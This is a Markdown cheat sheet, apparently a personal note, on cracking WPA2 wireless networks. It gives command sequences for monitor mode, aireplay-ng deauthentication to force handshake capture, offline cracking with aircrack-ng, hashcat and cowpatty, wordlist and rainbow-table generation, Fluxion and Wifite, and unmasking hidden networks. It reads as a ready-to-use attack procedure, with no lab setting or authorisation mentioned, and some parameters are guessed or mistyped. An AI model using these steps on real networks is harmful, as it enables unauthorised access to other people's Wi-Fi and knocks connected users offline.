# WPA2 Wireless Cracking

## Tables des matière
 - [Enabling Monitor mode on your network card](#Enabling-Monitor-mode-on-your-network-card)
 - [Capturing handshake with airodump](#Capturing-handshake-with-airodump)
 - [Cracking with Aircrack](#Cracking-with-Aircrack)
 - [Cracking with Hashcat](#Cracking-with-Hashcat)
 - [Cracking with cowpatty](#Cracking-with-cowpatty)
 - [Creating wordlists](#Creating-wordlists)
 - [Rainbow table](#Rainbow-table)
 - [Fluxion](#Fluxion)
 - [Wifite](#Wifite)
 - [Finding and cracking hidden network](#Finding-and-cracking-hidden-network)
 
 

### Enabling Monitor mode on your network card
	
Check your mode tiping `iwconfig`. Put your network card down. Type `airmon-ng check <network_card_name>`. Type `airmon-ng check kill <network_card_name>`. 

Type `iwconfig <network_card_name> mode monitor`. Put your network card up.
	 
### Capturing handshake with airodump

List all of the netwworks around you : `airodump-ng <network_card_name>`

List all of the devices connected to a network : `airodump-ng -c <network_channel> --bssid <network_bssid> -w <name_file_you_want_to_create> <network_card_name>`

In the same time you perform this command, type in another terminal : `aireplay-ng -0 0 -a <bssid> <network_card_name>`

Press `^C` and all the devices will be reconnected to the access point and you see in the terminal which you run the airodump command that the WPA handshake have been found.

4 files have been created and you can open the .cap in wireshark. You can filtered by `eapol` in order to see the packets link to the reconnection.
	
### Cracking with Aircrack 

**Use CPU power** 

You can brute-forcing th password by tiping : `aircrack-ng -w <wordlist> <file.cap>`

### Cracking with Hashcat

**Use GPU power** 

In order to crack with Hashcat you must convert the .cap to a hashcat capture file --> `https://hashcat.net/cap2hccapx/`

Cracking command : `hashcat -a <perform_level(2?)> -m <hashtype(2500?for_the_wpa2)> <file.hccapx> <wordlist>`

### Cracking with cowpatty

`cowpatty -f <wordlist> -r <file.pcap> -s <name_access_point>`

### Creating wordlists

**crunch** - very useful, generate wordlist with (characters/words) in relation to the entries you made

**cupp** (github) - generate worlds with (characters/words) in relation to the answers of their questions

### Rainbow table 

These are useful for brute-force a hash code.

In order to generate a rainbow table --> `rtgen` --> see help for your use.

A .rt file is created. Don't forget to sort the rainbow table : `rsort`

You can retrieve a word by its hash hash -->` rcrack . -h <hash>` 

--> For WPA-WPA2 carcking :
	
	-create file with the name of the essid of your access point (SFR_0F30?)

  	-airolib-ng <rainbow_table_name> --import essid <essid_name_file>
  
  	-airolib-ng <rainbow_table_name> --import passwd <wordlist>
		
  	-airolib-ng <rainbow_table_name> --clean all
		
  	-airolib-ng <rainbow_table_name> --batch

  	-airolib-ng <rainbow_table_name> --verify all
		
 	-aircrack-ng -r <rainbow_table_name> <file.cap>
	
### Fluxion

Tool that automate all the steps.

### Wifite

Tool that automate all the steps and more <-- very very useful

Finding and cracking hidden network :
	
List all of the netwworks around you : `airodump-ng <network_card_name>`

If you see an access point without name but with `<length: 0>`, it is a hidden network 
	
List all of the devices connected to a network : `airodump-ng  --bssid <network_bssid> --channel <channel_network> <network_card_name>`
	
In the same time you perform this command, type in another terminal : `aireplay-ng --deauth <number_of_deauthtificated_packets> -a <bssid> -c <station(mac_adress_of_the_client)> <network_card_name>`
	
The essid appears in the terminal you run the airodump command and you can connect to the hidden network
